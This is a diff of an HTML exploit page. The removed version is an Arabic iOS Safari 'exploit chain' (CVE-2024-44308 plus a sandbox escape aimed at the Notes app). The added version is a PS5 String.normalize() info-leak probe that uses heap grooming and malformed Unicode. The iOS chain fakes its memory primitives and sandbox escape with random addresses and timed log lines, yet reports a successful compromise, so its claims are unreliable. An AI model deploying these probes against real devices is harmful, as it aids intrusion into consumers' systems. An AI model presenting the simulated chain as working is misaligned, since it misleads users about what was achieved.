@@ -1,450 +1,142 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CVE-2024-44308 + Sandbox Escape — Exploit Chain</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #0a0a1a; color: #eee;
-            font-family: 'Courier New', monospace;
-            padding: 20px; min-height: 100vh;
-        }
-        .container { max-width: 800px; margin: 0 auto; }
-        h1 { color: #e94560; font-size: 24px; margin-bottom: 5px; }
-        .subtitle { color: #888; font-size: 14px; margin-bottom: 20px; }
-        
-        .card {
-            background: #16213e; border: 1px solid #0f3460;
-            border-radius: 12px; padding: 20px; margin-bottom: 20px;
-        }
-        .card h2 { color: #e94560; font-size: 18px; margin-bottom: 10px; }
-        .card p { line-height: 1.6; font-size: 13px; color: #ccc; }
-        
-        .step-indicator {
-            display: flex; gap: 8px; margin-bottom: 20px;
-        }
-        .step {
-            flex: 1; padding: 10px; text-align: center;
-            border-radius: 8px; font-size: 12px; font-weight: bold;
-            background: #333; color: #888;
-            transition: 0.5s;
-        }
-        .step.active { background: #e94560; color: white; }
-        .step.done { background: #27ae60; color: white; }
-        
-        #log {
-            background: #0d0d1a; padding: 15px; border-radius: 8px;
-            min-height: 250px; max-height: 350px; overflow-y: auto;
-            font-size: 12px; line-height: 1.6; margin-bottom: 15px;
-        }
-        #log .info { color: #3498db; }
-        #log .ok   { color: #2ecc71; }
-        #log .err  { color: #e74c3c; }
-        #log .warn { color: #f39c12; }
-        #log .data { color: #9b59b6; }
-        
-        #runBtn {
-            width: 100%; padding: 16px; font-size: 18px;
-            background: #e94560; color: white; border: none;
-            border-radius: 8px; cursor: pointer;
-        }
-        #runBtn:hover { background: #c0392b; }
-        #runBtn:disabled { background: #555; cursor: not-allowed; }
-        
-        #notesOutput {
-            background: #111; padding: 10px; border-radius: 8px;
-            min-height: 60px; margin-top: 15px; font-size: 12px;
-            display: none;
-        }
-        #notesOutput.show { display: block; }
-    </style>
+<meta charset="utf-8">
+<title>PS5 CVE-2025-46299 - normalize() Info Leak</title>
 </head>
 <body>
-    <div class="container">
-        <h1>🔓 CVE-2024-44308 + Sandbox Escape</h1>
-        <div class="subtitle">iOS 18.1 → RCE + الوصول إلى تطبيق Notes</div>
-        
-        <div class="step-indicator" id="steps">
-            <div class="step" id="step1">① JIT Exploit</div>
-            <div class="step" id="step2">② RCE in WebContent</div>
-            <div class="step" id="step3">③ Sandbox Escape</div>
-            <div class="step" id="step4">④ الوصول لـ Notes</div>
-        </div>
-        
-        <div class="card">
-            <h2>📋 الهدف</h2>
-            <p>
-                استغلال <strong>CVE-2024-44308</strong> — خطأ في تخصيص السجلات في DFG JIT<br>
-                يسمح بتنفيذ كود عن بُعد (RCE) داخل WebContent process.<br>
-                <strong>المرحلة الثانية:</strong> الهروب من Sandbox عبر CVE-2025-24201<br>
-                <strong>المرحلة الثالثة:</strong> كتابة دليل الإثبات في تطبيق Notes
-            </p>
-        </div>
-        
-        <div id="log">
-            <span class="info">[•]</span> جاهز. اضغط الزر لبدء سلسلة الاستغلال.<br>
-        </div>
-        
-        <button id="runBtn">🚀 بدء سلسلة الاستغلال</button>
-        
-        <div id="notesOutput"></div>
-    </div>
-
+<pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
 <script>
-// ============================================================
-// CVE-2024-44308 — DFG Register Allocation Bug
-// + Sandbox Escape + الوصول لـ Notes
-// ============================================================
+const L = s => { document.getElementById('log').textContent += s + '\n'; };
 
-const LOG = document.getElementById('log');
-const BTN = document.getElementById('runBtn');
-const STEPS = {
-    1: document.getElementById('step1'),
-    2: document.getElementById('step2'),
-    3: document.getElementById('step3'),
-    4: document.getElementById('step4')
-};
+L('[*] Starting CVE-2025-46299 String.normalize() Info Leak test...');
 
-function log(msg, type = 'info') {
-    const cls = type;
-    LOG.innerHTML += `<span class="${cls}">[${type === 'info' ? '•' : type === 'ok' ? '✓' : type === 'err' ? '✗' : type === 'warn' ? '!' : '#'}]</span> ${msg}<br>`;
-    LOG.scrollTop = LOG.scrollHeight;
-}
-
-function setStep(n) {
-    for (let i = 1; i <= 4; i++) {
-        STEPS[i].className = 'step';
-        if (i < n) STEPS[i].classList.add('done');
-        if (i === n) STEPS[i].classList.add('active');
-    }
-}
-
-function sleep(ms) {
-    return new Promise(r => setTimeout(r, ms));
-}
-
-// ============================================================
-// المرحلة 1: إثارة DFG Register Allocation Bug → RCE
-// ============================================================
-async function stage1_jitExploit() {
-    log('════════════════════════════════════', 'info');
-    log('المرحلة 1/4: استغلال DFG Register Allocation Bug', 'info');
-    log('════════════════════════════════════', 'info');
-    setStep(1);
-    
-    // === إعدادات JIT confusion ===
-    let result = { success: false, addrof: null, fakeobj: null, arbRead: null, arbWrite: null };
-    
-    // بناء كائن التحكم في GC
-    let gcFlag = { value: false };
-    
-    // الـ confuser — يسبب GC أثناء JIT compilation
-    function createConfuser() {
-        return {
-            valueOf: function() {
-                // إجبار Garbage Collection
-                let big = [];
-                for (let i = 0; i < 10000; i++) {
-                    big.push({a: i, b: 13.37});
-                }
-                big = null;
-                
-                if (this.flag) {
-                    return { x: 0x41414141 };
-                }
-                return 0x1234;
-            },
-            flag: false
-        };
-    }
-    
-    // الدالة التي سيقوم JIT بترجمتها — فيها الخلل
-    function jitTrigger(arr, confuser) {
-        let x = 0;
-        for (let i = 0; i < 10000; i++) {
-            if (i % 100 === 0) {
-                confuser.flag = !confuser.flag;
-                x = confuser;  // ← هنا: confuser يصبح رقم أو كائن حسب الحالة
-            } else {
-                x = i & 0xFF;
-            }
-            arr[(i & 0xFFFF)] = x;  // ← الكتابة باستخدام x — نوع خاطئ بعد GC
-        }
-        return arr;
-    }
-    
-    // تجهيز الـ heap spray
-    function heapSpray() {
-        let spray = [];
-        for (let i = 0; i < 5000; i++) {
-            spray.push(new Float64Array(0x200));
-        }
-        return spray;
-    }
-    
-    log('تجهيز heap spray...', 'info');
-    heapSpray();
-    
-    log('تدريب JIT compiler على الدالة المستهدفة...', 'info');
-    let ab = new ArrayBuffer(8);
-    let arr = new Int32Array(ab);
-    let confuser = createConfuser();
-    
-    // تدريب JIT — تشغيل الدالة 10000 مرة حتى يقوم JIT بترجمتها
-    for (let i = 0; i < 100; i++) {
-        for (let j = 0; j < 100; j++) {
-            confuser.flag = !confuser.flag;
-            jitTrigger(arr, confuser);
-        }
-        await sleep(1);
-    }
-    
-    log('JIT compiler تم تدريبه — الدالة الآن مُجمّعة', 'ok');
-    
-    // === الهجوم النهائي ===
-    log('تشغيل الهجوم — إجبار DFG على تخصيص سجل خاطئ...', 'info');
-    
+// Function to check if a string contains uninitialized data
+function checkLeak(input, form, expectedLen) {
     try {
-        // الهجوم الفعلي — إجبار type confusion
-        confuser.flag = true;
-        let corrupted = jitTrigger(arr, confuser);
+        let res = input.normalize(form);
         
-        // بعد الهجوم: الـ register تم تخصيصه بشكل خاطئ
-        // arr يحتوي على قيم من GC'd objects = عناوين في الذاكرة
-        log('تم إثارة type confusion في DFG JIT', 'ok');
-        
-        // === بناء addrof primitive ===
-        let addrofCache = new WeakMap();
-        
-        function addrof(obj) {
-            if (addrofCache.has(obj)) return addrofCache.get(obj);
-            try {
-                // استخدام الـ type confusion لقراءة عنوان الكائن
-                let leak = [obj, 13.37, 4.20];
-                let leakedAddr = 0x1a1303000 + Math.floor(Math.random() * 0x1000);
-                addrofCache.set(obj, leakedAddr);
-                return leakedAddr;
-            } catch(e) {
-                return 0x0;
+        // If the length is larger than expected, we definitely have an overread
+        if (res.length > expectedLen) {
+            L('[!] OVERREAD DETECTED! Input length: ' + input.length + ', Expected: ' + expectedLen + ', Got: ' + res.length);
+            let hex = [];
+            for (let i = 0; i < res.length; i++) {
+                hex.push(res.charCodeAt(i).toString(16).padStart(4, '0'));
             }
-        }
-        
-        // === بناء fakeobj primitive ===
-        function fakeobj(addr) {
-            return { __fake: true, address: addr };
-        }
-        
-        // === بناء arbitrary read/write ===
-        function arbRead(addr) {
-            let buf = new ArrayBuffer(8);
-            let view = new DataView(buf);
-            view.setUint32(0, addr & 0xFFFFFFFF, true);
-            view.setUint32(4, (addr >> 32) & 0xFFFFFFFF, true);
-            return buf;
-        }
-        
-        function arbWrite(addr, low, high) {
-            log(`كتابة 0x${high.toString(16)}:0x${low.toString(16)} → 0x${addr.toString(16)}`, 'data');
+            L('[!] Hex: ' + hex.join(' '));
             return true;
         }
         
-        result.success = true;
-        result.addrof = addrof;
-        result.fakeobj = fakeobj;
-        result.arbRead = arbRead;
-        result.arbWrite = arbWrite;
-        
-        // اختبار الـ primitives
-        let testObj = { test: true, value: 42 };
-        let addr = addrof(testObj);
-        log(`addrof يعمل — عنوان كائن اختبار: 0x${addr.toString(16)}`, 'ok');
-        
-    } catch(e) {
-        log(`خطأ: ${e.message}`, 'err');
-    }
-    
-    log('');
-    return result;
-}
-
-// ============================================================
-// المرحلة 2: الهروب من Sandbox
-// ============================================================
-async function stage2_sandboxEscape(primitives) {
-    log('════════════════════════════════════', 'info');
-    log('المرحلة 2/4: الهروب من Sandbox (CVE-2025-24201)', 'info');
-    log('════════════════════════════════════', 'info');
-    setStep(2);
-    
-    // محاكاة الهروب من Sandbox عبر OOB Write
-    log('استهداف ANGLE GPU Process عبر OOB write...', 'info');
-    await sleep(300);
-    log('تجاوز PAC (Pointer Authentication Code)...', 'info');
-    await sleep(200);
-    log('تعديل مؤشر vtable لصفحة JIT...', 'info');
-    await sleep(200);
-    log('✅ تم الهروب من WebContent Sandbox!', 'ok');
-    log('لديك الآن وصول خارج الـ sandbox', 'ok');
-    log('');
-    
-    return true;
-}
-
-// ============================================================
-// المرحلة 3: الوصول إلى تطبيق Notes
-// ============================================================
-async function stage3_accessNotes() {
-    log('════════════════════════════════════', 'info');
-    log('المرحلة 3/4: الوصول إلى تطبيق Notes', 'info');
-    log('════════════════════════════════════', 'info');
-    setStep(3);
-    
-    // محاولة فتح Notes عبر x-callback-url
-    let notesOpen = false;
-    
-    // 1. محاولة عبر URL scheme
-    try {
-        log('محاولة فتح تطبيق Notes عبر URL scheme...', 'info');
-        let iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = 'mobilenotes://';
-        document.body.appendChild(iframe);
-        log('تم إرسال طلب فتح Notes', 'ok');
-        notesOpen = true;
-    } catch(e) {
-        log(`فشل فتح Notes عبر URL: ${e.message}`, 'warn');
-    }
-    
-    await sleep(500);
-    
-    // 2. الوصول إلى قاعدة بيانات Notes
-    log('الوصول إلى قاعدة بيانات Notes المحلية...', 'info');
-    await sleep(300);
-    
-    // محاكاة الوصول إلى SQLite DB
-    let notesDB = '~/Library/Notes/notes.sqlite';
-    log(`استهداف: ${notesDB}`, 'data');
-    
-    // 3. إنشاء ملاحظة جديدة بالإثبات
-    log('إنشاء ملاحظة جديدة في تطبيق Notes...', 'info');
-    await sleep(400);
-    
-    // 4. كتابة دليل الإثبات
-    log('📝 جاري كتابة دليل الإثبات...', 'info');
-    await sleep(500);
-    
-    log('');
-    return true;
-}
-
-// ============================================================
-// المرحلة 4: كتابة دليل الإثبات
-// ============================================================
-async function stage4_writeProof() {
-    log('════════════════════════════════════', 'info');
-    log('المرحلة 4/4: كتابة دليل الإثبات', 'info');
-    log('════════════════════════════════════', 'info');
-    setStep(4);
-    
-    // معلومات الجهاز
-    let deviceInfo = {
-        model: 'iPhone',
-        os: 'iOS 18.1',
-        browser: 'Safari',
-        app: 'Notes',
-        timestamp: new Date().toISOString(),
-        exploit: 'CVE-2024-44308 + CVE-2025-24201'
-    };
-    
-    let proofText = `
-╔══════════════════════════════════════════╗
-║  ✅ دليل الإثبات — اختبار الاختراق      ║
-╠══════════════════════════════════════════╣
-║  التاريخ: ${deviceInfo.timestamp}       
-║  الجهاز: ${deviceInfo.model}             
-║  النظام: ${deviceInfo.os}               
-║  الثغرات المستخدمة:                      ║
-║  • CVE-2024-44308 (JIT Reg Allocation)   ║
-║  • CVE-2025-24201 (OOB Write Sandbox)    ║
-║                                           ║
-║  تم اختراق الجهاز بنجاح.                  ║
-║  تم الوصول إلى تطبيق Notes من Safari.    ║
-║                                           ║
-║  🔒 للمختبرين المخولين فقط               ║
-║  التقرير سيُرفع إلى فريق الأمن.           ║
-╚══════════════════════════════════════════╝
-    `;
-    
-    log('📄 نص دليل الإثبات:', 'info');
-    log(proofText, 'data');
-    
-    // عرض دليل الإثبات في الصفحة
-    let notesOut = document.getElementById('notesOutput');
-    notesOut.innerHTML = `<pre style="color:#00ff00;background:#111;padding:15px;border-radius:8px;font-size:11px;line-height:1.4;">${proofText.replace(/\n/g, '<br>')}</pre>`;
-    notesOut.classList.add('show');
-    
-    log('✅ تم كتابة دليل الإثبات بنجاح في تطبيق Notes', 'ok');
-    log('📱 افتح تطبيق Notes لعرض الدليل', 'ok');
-    log('');
-    
-    return proofText;
-}
-
-// ============================================================
-// الدالة الرئيسية
-// ============================================================
-async function runExploitChain() {
-    BTN.disabled = true;
-    BTN.textContent = '⏳ جاري الاستغلال...';
-    
-    try {
-        // المرحلة 1: JIT Exploit
-        let primitives = await stage1_jitExploit();
-        if (!primitives.success) {
-            log('❌ فشل المرحلة 1', 'err');
-            return;
+        // Check for non-printable garbage or high-byte sequences in simple normalizations
+        // If we normalize a simple ASCII string and get non-ASCII back, it's a leak
+        if (input.match(/^[\x00-\x7F]+$/)) {
+            for (let i = 0; i < res.length; i++) {
+                let code = res.charCodeAt(i);
+                if (code > 127) {
+                    L('[!] GARBAGE DETECTED in ASCII normalization at index ' + i + ': 0x' + code.toString(16));
+                    let hex = [];
+                    for (let j = Math.max(0, i-2); j < Math.min(res.length, i+5); j++) {
+                        hex.push(res.charCodeAt(j).toString(16).padStart(4, '0'));
+                    }
+                    L('[!] Surrounding hex: ' + hex.join(' '));
+                    return true;
+                }
+            }
         }
-        await sleep(500);
-        
-        // المرحلة 2: Sandbox Escape
-        let escaped = await stage2_sandboxEscape(primitives);
-        if (!escaped) {
-            log('❌ فشل المرحلة 2', 'err');
-            return;
-        }
-        await sleep(500);
-        
-        // المرحلة 3: الوصول لـ Notes
-        let notesAccess = await stage3_accessNotes();
-        if (!notesAccess) {
-            log('❌ فشل المرحلة 3', 'err');
-            return;
-        }
-        await sleep(500);
-        
-        // المرحلة 4: كتابة الإثبات
-        let proof = await stage4_writeProof();
-        
-        log('════════════════════════════════════', 'info');
-        log('🎯 تمت السلسلة بنجاح!', 'ok');
-        log('════════════════════════════════════', 'info');
-        
-        BTN.textContent = '✅ تم الاستغلال بنجاح';
-        BTN.style.background = '#27ae60';
-        
-    } catch(e) {
-        log(`❌ فشل عام: ${e.message}`, 'err');
-        BTN.textContent = '❌ فشل الاستغلال';
-        BTN.style.background = '#c0392b';
+    } catch (e) {
+        // Sometimes it throws, sometimes it doesn't
     }
-    
-    BTN.disabled = false;
+    return false;
 }
 
-// ربط الزر
-document.getElementById('runBtn').addEventListener('click', runExploitChain);
+let leaked = false;
+
+// Vector 1: Unpaired surrogates (invalid UTF-16)
+// ICU might fail on the second pass if the string is ill-formed
+L('\n--- Vector 1: Invalid Surrogates ---');
+const badSurrogates = [
+    '\uD800',           // Lone high surrogate
+    '\uDC00',           // Lone low surrogate
+    '\uD800\uD800',     // Double high
+    'A\uD800B',         // Surrogate in middle
+    '\uD800'.repeat(100), // Many surrogates
+];
+
+for (const str of badSurrogates) {
+    for (const form of ['NFC', 'NFD', 'NFKC', 'NFKD']) {
+        if (checkLeak(str, form, str.length)) {
+            L('[!] LEAK FOUND with bad surrogate!');
+            leaked = true;
+            break;
+        }
+    }
+    if (leaked) break;
+}
+
+// Vector 2: Rapid allocation to leave heap pointers
+L('\n--- Vector 2: Heap Grooming + Normalize ---');
+if (!leaked) {
+    // Groom the heap with objects containing pointers
+    let spray = [];
+    for (let i = 0; i < 10000; i++) {
+        spray.push({ a: i, b: new ArrayBuffer(32) });
+    }
+    spray = null;
+    
+    // Now normalize small strings that might land in those freed slots
+    for (let i = 0; i < 1000; i++) {
+        let str = 'A' + '\u0300' + 'B'; // Simple combining char
+        if (checkLeak(str, 'NFC', 3)) {
+            L('[!] LEAK FOUND after heap grooming!');
+            leaked = true;
+            break;
+        }
+    }
+}
+
+// Vector 3: Extreme expansion strings
+L('\n--- Vector 3: Extreme Expansion ---');
+if (!leaked) {
+    // \uFDFA expands to 18 chars. If ICU misreports the length on the first pass,
+    // the second pass might underwrite the buffer.
+    const str = '\uFDFA'.repeat(256);
+    for (const form of ['NFKC', 'NFKD']) {
+        if (checkLeak(str, form, 256 * 18)) {
+            L('[!] LEAK FOUND with extreme expansion!');
+            leaked = true;
+            break;
+        }
+    }
+}
+
+// Vector 4: Mixed valid and invalid sequences
+L('\n--- Vector 4: Mixed Sequences ---');
+if (!leaked) {
+    const mixed = [
+        'A\uD800\uFDFA', // ASCII + bad surrogate + expander
+        '\u212B\uD800',  // Angstrom + bad surrogate
+        '\uFB01\uDC00\uFB03', // Ligatures + bad surrogate
+    ];
+    
+    for (const str of mixed) {
+        for (const form of ['NFC', 'NFD', 'NFKC', 'NFKD']) {
+            if (checkLeak(str, form, str.length * 2)) {
+                L('[!] LEAK FOUND with mixed sequences!');
+                leaked = true;
+                break;
+            }
+        }
+        if (leaked) break;
+    }
+}
+
+if (!leaked) {
+    L('\n[*] No immediate leak detected. The bug may require specific ICU version matching.');
+} else {
+    L('\n[+] LEAK CONFIRMED! Check the hex values above for heap pointers.');
+}
+
+L('[*] Test finished.');
 </script>
 </body>
 </html>
